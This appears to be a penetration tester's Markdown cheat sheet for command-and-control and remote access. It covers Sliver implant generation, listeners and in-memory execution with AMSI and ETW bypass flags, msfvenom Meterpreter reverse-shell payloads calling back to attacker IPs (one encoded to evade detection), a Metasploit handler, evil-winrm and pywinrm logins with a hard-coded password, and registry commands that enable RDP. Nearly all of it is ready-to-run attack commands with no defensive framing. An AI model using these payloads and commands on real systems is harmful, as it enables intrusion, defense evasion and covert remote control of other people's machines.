# Remote Management

## C2

### Sliver

```bash
### INITIAL
sliver-server


############################
### IMPLANTS & LISTENERS ###
############################
generate --mtls 192.168.68.1:3898 --format shellcode --save implant_s.shc
mtls --lhost 192.168.68.1 --lport 3898 --persistent


###########################
### COMMAND AND CONTROL ### after a "use $SESSION_UID"
###########################
use $SESSION_ID            # use a sesison (can type a short version)

getprivs                   # return whoami /all
upload $LOCAL_FILE         # upload a local file
download $REMOTE_FILE      # download remote file (use / slashes)

#################
### EXECUTION ###
#################
### {https://sliver.sh/docs?name=Third+Party+Tools}
### execute-assembly (.NET Framework ONLY) (Assembly.Load() powered in-memory execution)
execute-assembly $LOCAL_FILE $ARGS
execute-assembly --in-process --amsi-bypass --etw-bypass $LOCAL_FILE $ARGS

### sideload (convert to shellcode, load and execute a PE (DLL/EXE), ELF (???) or shared library in any process' memory (sliver uses "Donut" for that))

### spawndll

### execute-shellcode (executes given shellcode in sliver's process memory)

### execute (fork&run)
execute $REMOTE_FILE $ARGS # execute remote file


###############
### LISTING ###
###############
jobs                       # list jobs 
operators                  # list remote operators connected to sliver-server
implants                   # list generated implants
sessions                   # list established sessions
hosts                      # list hosts
```

### Meterpreter

```bash
###########################
###   USAGE: SESSIONS   ###
###########################
# meterpreter is used through "sessions" command
-l, --list             # list sessions
-i, --interact $ID     # enter interactive mode
-c, --command $CMD     # run command on all sessions (or on specific session if --interact is specified)
-C                     # run meterpreter command (same as above)


##############################
###   USAGE: METERPRETER   ###
##############################
### GENERAL
shell                  # enter a standard shell
bg                     # bg the current session
jobs -l                # list all running jobs

### FS
upload $SRC $DEST      # upload a file (use tab to navigate)


###################
###   REVERSE   ###
###################
### payload/linux/x64/meterpreter/reverse_tcp (staged)
### payload/windows/x64/meterpreter/reverse_tcp (staged)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST='10.10.14.123' LPORT='9596' -f elf | base64 -w 0
# STAGED
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.10.14.123' LPORT='9596' -f raw
# STAGELESS
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST='10.10.14.123' LPORT='9596' -f raw
# STAGELESS SGN
msfvenom -p windows/meterpreter_reverse_tcp EXITFUNC="thread" LHOST='192.168.68.1' LPORT='4444' -f raw --encoder x86/shikata_ga_nai -i 5 > implant.shc

### starting a listener
use multi/handler
# set payload windows/x64/meterpreter/reverse_tcp
set payload $PAYLOAD
setg smth $SMTH
set lhost $LHOST
set lport $LPORT
exploit -j
```

## evil-winrm

```bash
# add a realm to krb5.conf (note the capitalization)
cat /etc/krb5.conf | grep -A1 realms
# [realms]
#      CONTOSO.ORG = { kdc = WIN-KML6TP4LOOL.contoso.org }

klist
# Ticket cache: FILE:Administrator@WSMAN_WIN-NUU0DPB1BVC.contoso.org@CONTOSO.ORG.ccache
# Default principal: Administrator@contoso.org

evil-winrm -i WIN-NUU0DPB1BVC.contoso.org -r contoso.org --spn WSMAN
```

## pywinrm

```py
import winrm
session = winrm.Session('192.168.68.72', auth=('administrator','win2016-cli-passwd'), transport='ntlm')
session.run_ps("whoami").std_out
```

## RDP

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

```bash
rdesktop $IP:$PORT
```
